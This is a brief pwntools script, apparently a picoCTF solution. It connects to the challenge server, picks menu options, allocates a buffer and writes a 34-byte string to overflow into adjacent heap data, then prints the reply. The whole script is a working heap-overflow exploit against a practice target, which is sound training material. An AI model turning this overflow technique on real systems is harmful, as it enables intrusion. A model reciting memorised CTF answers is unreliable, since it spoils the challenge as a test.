from pwn import *

#p = process("chall")

p = remote("tethys.picoctf.net", 53444)

payload = "a" * 30 + "pico"

p.recvuntil("choice:")
p.sendline("5")

p.recvuntil("choice:")
p.sendline("2")

p.recvuntil("allocation:")
p.sendline("35")
p.sendline(payload)

p.recvuntil("choice:")
p.sendline("4")


print(p.recvall())


